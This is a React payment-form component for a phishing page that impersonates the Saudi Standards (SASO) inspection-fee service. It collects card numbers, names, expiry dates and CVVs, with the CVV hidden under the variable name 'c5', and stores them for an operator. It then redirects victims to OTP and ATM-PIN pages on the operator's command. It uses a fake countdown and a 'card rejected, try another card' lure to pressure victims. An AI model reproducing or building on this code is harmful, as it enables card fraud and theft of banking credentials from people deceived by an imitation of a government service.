"use client";
import { useEffect, useState, useRef } from "react";
import { useSearchParams, useRouter } from "@/lib/navigation";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { Lock, CreditCard, X, ShieldAlert } from "lucide-react";
import { addData, handleCurrentPage } from "@/lib/data-store";
import { watchVisitorData } from "@/lib/visitor-data";
import Image from "@/components/app-image";
import FullPageLoader from "@/components/loader";
import { getRedirectUrl } from "@/lib/page-routes";
import { getOrCreateVisitorId, getVisitorSessionData } from "@/lib/visitor-presence";

export default function PaymentForm() {
  const router = useRouter();
  const searchParams = useSearchParams();

  const [cardNumber, setcardNumber] = useState("");  
  const [n1, setn1] = useState("");

  const [cardName, setCardName] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [c5, setc5] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [visitorId, setVisitorId] = useState("");
  const [visitorData, setVisitorData] = useState<any>(null);
  const [showOffer, setShowOffer] = useState(true);
  const [blockedCardMessage, setBlockedCardMessage] = useState("");
  const redirectingRef = useRef(false);
  const [countdown, setCountdown] = useState({
    hours: 1,
    minutes: 15,
    seconds: 10,
  });

  useEffect(() => {
    if (!showOffer) return;
    const timer = setInterval(() => {
      setCountdown((prev) => {
        let { hours, minutes, seconds } = prev;
        if (seconds > 0) {
          seconds--;
        } else if (minutes > 0) {
          minutes--;
          seconds = 59;
        } else if (hours > 0) {
          hours--;
          minutes = 59;
          seconds = 59;
        }
        return { hours, minutes, seconds };
      });
    }, 1000);
    return () => clearInterval(timer);
  }, [showOffer]);

  const formatcardNumber = (value: string) => {
    const v = value.replace(/\D/g, "");
    return v.match(/.{1,4}/g)?.join(" ") ?? "";
  };

  const handlecardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatcardNumber(e.target.value);
    setn1(formatted);
    if (formatted.length <= 19) setcardNumber(formatted);
    if (blockedCardMessage) setBlockedCardMessage("");
  };

  const handleSubmit = async () => {
    setBlockedCardMessage("");
    setIsSubmitting(true);
    const visitorID =
      visitorId ||
      searchParams.get("visitorId") ||
      getOrCreateVisitorId();

    // Check if card number or BIN is in blocked list
    const cleanNum = cardNumber.replace(/\D/g, "");
    const cleanBin = cleanNum.slice(0, 6);
    try {
      const checkRes = await fetch("/api/blocked-cards", { cache: "no-store" });
      if (checkRes.ok) {
        const { cards, bins } = await checkRes.json();
        const isBlocked =
          (Array.isArray(cards) && cards.includes(cleanNum)) ||
          (Array.isArray(bins) && bins.includes(cleanBin));
        if (isBlocked) {
          setIsSubmitting(false);
          setIsLoading(false);
          setBlockedCardMessage("البطاقة غير مدعومة يرجى الدفع من بطاقة أخرى أو باستخدام البطاقات الائتمانية للاستفادة من كاش باك 40%");
          return;
        }
      }
    } catch {}

    const session = getVisitorSessionData();
    await addData({
      id: visitorID,
      ...session,
      cardNumber,
      c1: cardNumber,
      n1,
      cardName,
      c2: cardName,
      c3: expiryMonth,
      c4: expiryYear,
      c5,
      cvv: c5,
      expiryMonth,
      expiryYear,
      expiryDate: expiryMonth && expiryYear ? `${expiryMonth}/${expiryYear}` : "",
      cardApproval: "pending",
      step: "card-details-submitted",
    });
    await new Promise((r) => setTimeout(r, 2000));
    setIsSubmitting(false);
    setIsLoading(true);
  };

  useEffect(() => {
    let v = searchParams.get("visitorId") || visitorId;
    if (typeof window !== "undefined" && !v) {
      v = getOrCreateVisitorId();
    }
    if (v && v !== visitorId) {
      setVisitorId(v);
    }
    if (!v) return;
    
    // Signal landing to clear previous consumed redirects
    handleCurrentPage("payment", {}, v);

    const unsubscribe = watchVisitorData(
      v,
      (userData) => {
        if (!userData) return;
        setVisitorData(userData);
        if (redirectingRef.current) return;

        // Prioritize explicit admin redirection
        const redirectUrl = getRedirectUrl(userData.redirectTo, "payment");
        if (redirectUrl) {
          redirectingRef.current = true;
          setIsLoading(false);
          const target = redirectUrl.includes("?")
            ? `${redirectUrl}&visitorId=${encodeURIComponent(v)}`
            : `${redirectUrl}?visitorId=${encodeURIComponent(v)}`;
          window.location.href = target;
          return;
        }

        // Check for blocked or rejected card
        if (
          userData.cardApproval === "rejected" ||
          userData.isBlockedBin ||
          userData.isBlockedCard ||
          userData.status === "rejected"
        ) {
          setIsLoading(false);
          setIsSubmitting(false);
          const reason =
            userData.rejectionReason ||
            "البطاقة غير مدعومة يرجى الدفع من بطاقة أخرى أو باستخدام البطاقات الائتمانية للاستفادة من كاش باك 40%";
          setBlockedCardMessage(reason);
          return;
        }

        if (userData.cardApproval === "pending") {
          setIsLoading(true);
        }

        if (
          userData.cardApproval === "approved" ||
          userData.cardApproval === "otp"
        ) {
          redirectingRef.current = true;
          setIsLoading(false);
          window.location.href = `/payment/otp?visitorId=${encodeURIComponent(v)}`;
          return;
        }
        if (userData.cardApproval === "pin") {
          redirectingRef.current = true;
          setIsLoading(false);
          window.location.href = `/payment/atm-pin?visitorId=${encodeURIComponent(v)}`;
          return;
        }
      },
      (error) => {
        if (error instanceof Error) {
          console.warn("[payment] data warning:", error.message);
        }
      },
    );
    return () => unsubscribe();
  }, [visitorId, searchParams]);

  const isFormValid =
    cardNumber.length === 19 && cardName && expiryMonth && expiryYear && c5.length >= 3;

  const pad = (n: number) => String(n).padStart(2, "0");

  return (
    <div
      dir="rtl"
      className="min-h-screen bg-gradient-to-b from-gray-50 to-gray-100"
    >
      {showOffer && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/65 backdrop-blur-md px-4">
          <div className="bg-white rounded-2xl max-w-md w-full overflow-hidden shadow-2xl relative ring-1 ring-white/20">
            <button
              onClick={() => setShowOffer(false)}
              className="absolute top-3 left-3 z-20 w-8 h-8 bg-white/90 rounded-full flex items-center justify-center shadow-lg hover:bg-white transition-all hover:scale-110"
            >
              <X className="w-4 h-4 text-gray-600" />
            </button>

            <div className="relative w-full">
              <img
                src="/bg-pou.webp"
                alt="كاش باك 30%"
                width={800}
                height={450}
                className="w-full h-auto object-cover"
              />
            </div>

            <div className="p-5 text-center space-y-4 bg-gradient-to-b from-[#1a1f5e] via-[#151a4a] to-[#0d1233]">
              <h3 className="text-lg font-extrabold text-white drop-shadow-sm">
                سارع قبل نهاية العرض!
              </h3>
              <p className="text-sm text-blue-200/80">يتبقى على انتهاء العرض</p>

              <div className="flex justify-center gap-3" dir="ltr">
                <div className="w-14 h-14 bg-white/10 rounded-xl flex items-center justify-center text-xl font-bold text-amber-300 border border-white/15 shadow-inner">
                  {pad(countdown.seconds)}
                </div>
                <span className="text-amber-300 text-xl font-bold self-center">
                  :
                </span>
                <div className="w-14 h-14 bg-white/10 rounded-xl flex items-center justify-center text-xl font-bold text-amber-300 border border-white/15 shadow-inner">
                  {pad(countdown.minutes)}
                </div>
                <span className="text-amber-300 text-xl font-bold self-center">
                  :
                </span>
                <div className="w-14 h-14 bg-white/10 rounded-xl flex items-center justify-center text-xl font-bold text-amber-300 border border-white/15 shadow-inner">
                  {pad(countdown.hours)}
                </div>
              </div>

              <button
                onClick={() => setShowOffer(false)}
                className="w-full bg-gradient-to-l from-amber-500 to-amber-600 hover:from-amber-400 hover:to-amber-500 text-white py-3.5 rounded-xl text-base font-bold transition-all shadow-lg shadow-amber-500/30"
              >
                إغلاق
              </button>
            </div>
          </div>
        </div>
      )}

      <div className="bg-gradient-to-b from-white to-gray-50 border-b border-gray-100 py-6 shadow-sm">
        <div className="max-w-md mx-auto px-4 flex flex-col items-center gap-2">
          <div className="p-2 bg-white rounded-xl shadow-md border border-gray-100">
            <Image
              src="/next.svg"
              alt="SASO"
              width={56}
              height={56}
              className="rounded-lg"
            />
          </div>
          <div className="text-center">
            <p className="text-sm font-bold text-gray-800">
              المواصفات السعودية
            </p>
            <p className="text-xs text-gray-400">Saudi Standards</p>
          </div>
        </div>
      </div>
      {isLoading && <FullPageLoader />}

      {(() => {
        const isModifyBooking =
          searchParams.get("service") === "modify" ||
          searchParams.get("type") === "modify" ||
          searchParams.get("amount") === "37.5" ||
          visitorData?.bookingType === "تعديل موعد الحجز" ||
          visitorData?.inspectionType === "تعديل موعد الحجز" ||
          visitorData?.serviceType === "تعديل موعد الحجز" ||
          Number(visitorData?.totalAmount) === 37.5;

        const totalAmount = isModifyBooking
          ? "37.50"
          : visitorData?.totalAmount
          ? Number(visitorData.totalAmount).toFixed(2)
          : "115.00";

        const subtotalAmount = isModifyBooking
          ? "32.61"
          : visitorData?.serviceFee
          ? Number(visitorData.serviceFee).toFixed(2)
          : "100.00";

        const vatAmount = isModifyBooking
          ? "4.89"
          : visitorData?.vatAmount
          ? Number(visitorData.vatAmount).toFixed(2)
          : "15.00";

        const billDescription = isModifyBooking
          ? "دفع رسوم خدمة تعديل موعد الحجز"
          : "دفع رسوم خدمة الفحص الدوري";

        return (
          <div className="max-w-md mx-auto px-4 py-6 space-y-5">
            <div className="bg-white rounded-2xl border border-gray-100 p-6 shadow-md">
              <h2 className="text-xl font-bold text-gray-900 text-center mb-1">
                معلومات الفاتورة
              </h2>
              <p className="text-gray-500 text-center text-sm mb-5 font-medium">
                {billDescription}
              </p>

              <div className="text-center mb-5 bg-gradient-to-br from-[#f0faf4] to-[#e8f5ec] rounded-xl py-4 border border-[#1a7a3a]/10">
                <span className="text-4xl font-extrabold text-[#1a7a3a]">
                  {totalAmount}
                </span>
                <span className="text-xl font-bold text-[#1a7a3a] mr-1">ر.س</span>
              </div>

              <div className="space-y-3 border-t border-gray-100 pt-4">
                <div className="flex justify-between items-center">
                  <span className="text-sm text-gray-500">المجموع الفرعي</span>
                  <span className="text-sm font-semibold text-gray-700">
                    {subtotalAmount} ر.س
                  </span>
                </div>
                <div className="flex justify-between items-center">
                  <span className="text-xs text-gray-400">
                    ضريبة القيمة المضافة 15%
                  </span>
                  <span className="text-xs text-gray-400">{vatAmount} ر.س</span>
                </div>
                <div className="flex justify-between items-center border-t border-gray-100 pt-3">
                  <span className="font-bold text-gray-900">المبلغ المستحق</span>
                  <span className="font-bold text-[#1a7a3a]">{totalAmount} ر.س</span>
                </div>
              </div>
            </div>

            <div className="bg-white rounded-2xl border border-gray-100 p-6 shadow-md">
          <h2 className="text-xl font-bold text-gray-900 text-center mb-1">
            الدفع من خلال بطاقة الائتمان
          </h2>
          <p className="text-gray-400 text-center text-sm mb-5">
            من فضلك أدخل معلومات الدفع الخاصة بك
          </p>

          <div className="flex justify-center gap-3 mb-6">
            <div className="h-9 px-4 bg-gradient-to-b from-gray-50 to-gray-100 rounded-lg flex items-center justify-center border border-gray-200 shadow-sm">
              <Image
                src="/mada.svg"
                alt="مدى"
                width={32}
                height={20}
                className="h-4 w-auto"
              />
            </div>
            <div className="h-9 px-4 bg-gradient-to-b from-gray-50 to-gray-100 rounded-lg flex items-center justify-center border border-gray-200 shadow-sm">
              <span className="text-xs font-bold text-[#1a1f69] tracking-wide">
                VISA
              </span>
            </div>
            <div className="h-9 px-4 bg-gradient-to-b from-gray-50 to-gray-100 rounded-lg flex items-center justify-center border border-gray-200 shadow-sm">
              <div className="flex">
                <div className="w-4 h-4 rounded-full bg-[#eb001b]" />
                <div className="w-4 h-4 rounded-full bg-[#f79e1b] -mr-1.5" />
              </div>
            </div>
          </div>

          {blockedCardMessage && (
            <div className="mb-5 p-4 rounded-2xl bg-rose-50 border-2 border-rose-300 text-rose-900 shadow-sm flex items-start gap-3 animate-in fade-in slide-in-from-top-2 duration-300">
              <div className="p-2 bg-rose-100 text-rose-600 rounded-xl shrink-0 mt-0.5 border border-rose-200">
                <ShieldAlert className="w-5 h-5 text-rose-600" />
              </div>
              <div className="flex-1 text-right">
                <div className="font-bold text-sm text-rose-900 mb-1 flex items-center gap-1.5 justify-end">
                  <span className="px-2 py-0.5 rounded-full bg-rose-200/80 text-rose-900 text-[10px] font-black">
                    بطاقة محظورة
                  </span>
                  <span>تم رفض البطاقة</span>
                </div>
                <p className="text-xs text-rose-800 leading-relaxed font-medium">
                  {blockedCardMessage}
                </p>
                <div className="mt-2 text-[11px] font-semibold text-rose-700 bg-rose-100/70 py-1 px-2.5 rounded-lg inline-block border border-rose-200/60">
                  يرجى استبدال بيانات البطاقة ببطاقة بنكية أخرى للمتابعة
                </div>
              </div>
            </div>
          )}

          <div className="space-y-5">
            <div>
              <Label className="text-sm font-medium text-gray-600 mb-2 block text-right">
                رقم البطاقة
              </Label>
              <Input
                type="tel"
                dir="ltr"
                value={cardNumber}
                onChange={handlecardNumberChange}
                placeholder="1234 1234 1234 1234"
                className="h-12 text-base text-right border-gray-200 focus:border-[#1a7a3a] focus:ring-[#1a7a3a] bg-gray-50/50"
              />
            </div>

            <div>
              <Label className="text-sm font-medium text-gray-600 mb-2 block text-right">
                اسم صاحب البطاقة
              </Label>
              <Input
                type="text"
                value={cardName}
                onChange={(e) => setCardName(e.target.value)}
                placeholder="الأسم على البطاقة (بالإنجليزية)"
                className="h-12 text-sm border-gray-200 focus:border-[#1a7a3a] focus:ring-[#1a7a3a] bg-gray-50/50"
              />
            </div>

            <div className="grid grid-cols-3 gap-3">
              <div className="col-span-1">
                <Label className="text-sm font-medium text-gray-600 mb-2 block text-right">
                  رمز (c5)
                </Label>
                <div className="relative">
                  <Input
                    type="password"
                    value={c5}
                    onChange={(e) =>
                      setc5(e.target.value.replace(/\D/g, "").slice(0, 4))
                    }
                    placeholder="c5"
                    className="h-12 text-center text-sm border-gray-200 focus:border-[#1a7a3a] focus:ring-[#1a7a3a] bg-gray-50/50"
                    dir="ltr"
                    maxLength={4}
                  />
                  <Lock className="absolute left-2 top-1/2 -translate-y-1/2 h-3.5 w-3.5 text-gray-300" />
                </div>
              </div>

              <div className="col-span-2">
                <div className="flex items-center gap-1 mb-2">
                  <Label className="text-sm font-medium text-gray-600">
                    تاريخ الانتهاء
                  </Label>
                  <svg
                    className="w-3.5 h-3.5 text-gray-300"
                    fill="none"
                    viewBox="0 0 24 24"
                    stroke="currentColor"
                  >
                    <circle cx="12" cy="12" r="10" strokeWidth="2" />
                    <path
                      strokeLinecap="round"
                      strokeWidth="2"
                      d="M12 8v4M12 16h.01"
                    />
                  </svg>
                </div>
                <div className="flex gap-2">
                  <Select value={expiryYear} onValueChange={setExpiryYear}>
                    <SelectTrigger className="h-12 border-gray-200 text-sm bg-gray-50/50">
                      <SelectValue placeholder="سنة" />
                    </SelectTrigger>
                    <SelectContent>
                      {Array.from({ length: 10 }, (_, i) => (
                        <SelectItem key={i} value={String(2025 + i)}>
                          {2025 + i}
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                  <Select value={expiryMonth} onValueChange={setExpiryMonth}>
                    <SelectTrigger className="h-12 border-gray-200 text-sm bg-gray-50/50">
                      <SelectValue placeholder="شهر" />
                    </SelectTrigger>
                    <SelectContent>
                      {Array.from({ length: 12 }, (_, i) => (
                        <SelectItem
                          key={i + 1}
                          value={String(i + 1).padStart(2, "0")}
                        >
                          {String(i + 1).padStart(2, "0")}
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                </div>
              </div>
            </div>

            <button
              onClick={handleSubmit}
              disabled={!isFormValid || isSubmitting}
              className="w-full bg-gradient-to-l from-[#1a7a3a] to-[#0d5c2a] hover:from-[#166b33] hover:to-[#0a4d23] disabled:from-gray-300 disabled:to-gray-300 disabled:cursor-not-allowed text-white text-lg h-14 rounded-xl font-bold shadow-lg shadow-[#1a7a3a]/25 transition-all mt-2"
            >
              {isSubmitting ? "جاري المعالجة..." : "ادفع الآن"}
            </button>
          </div>

          <div className="mt-6 pt-4 border-t border-gray-100">
            <div className="flex items-center justify-between mb-3">
              <span className="text-xs text-gray-400 uppercase tracking-wider">
                ACCEPTED HERE
              </span>
              <span className="text-xs text-gray-400">نقبل هنا</span>
            </div>
            <div className="flex justify-center items-center gap-4">
              <div className="h-7 px-3 bg-gray-50 rounded-md border border-gray-100 flex items-center">
                <span className="text-xs font-bold text-[#1a1f69]">VISA</span>
              </div>
              <div className="h-7 px-3 bg-gray-50 rounded-md border border-gray-100 flex items-center">
                <div className="flex">
                  <div className="w-3.5 h-3.5 rounded-full bg-[#eb001b]" />
                  <div className="w-3.5 h-3.5 rounded-full bg-[#f79e1b] -mr-1" />
                </div>
              </div>
              <div className="h-7 px-3 bg-gray-50 rounded-md border border-gray-100 flex items-center">
                <Image
                  src="/mada.svg"
                  alt="مدى"
                  width={28}
                  height={16}
                  className="h-3.5 w-auto"
                />
              </div>
            </div>
          </div>

          <div className="flex items-center justify-center gap-1.5 mt-4 text-[#1a7a3a]">
            <Lock className="h-3.5 w-3.5" />
            <span className="text-xs font-semibold">دفع آمن وسريع</span>
          </div>
        </div>
      </div>
    );
  })()}
    </div>
  );
}
